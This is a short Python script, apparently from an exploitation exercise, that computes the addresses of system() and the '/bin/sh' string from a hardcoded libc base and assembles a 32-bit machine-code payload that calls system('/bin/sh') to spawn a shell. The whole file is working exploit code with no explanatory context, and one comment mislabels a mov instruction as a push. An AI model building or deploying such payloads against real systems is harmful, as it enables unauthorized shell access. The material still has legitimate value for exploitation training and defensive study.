import struct

libc_base_adr = 0xf7e2c000
system_adr = libc_base_adr + 0x3eed0
bin_sh_adr = libc_base_adr + 0x15d7ec
print("addres of system = ", hex(system_adr))
print("addres of bin_sh = ", hex(bin_sh_adr))

# Create the payload
payload = b""
payload += b"\xc7\x04\x24"  # mov_dword
payload += struct.pack("<I", bin_sh_adr)
payload += b"\xb8"          # push address on eax
payload += struct.pack("<I", system_adr)  # current address for relative call
payload += b"\xff\xd0"      # call eax

print(payload)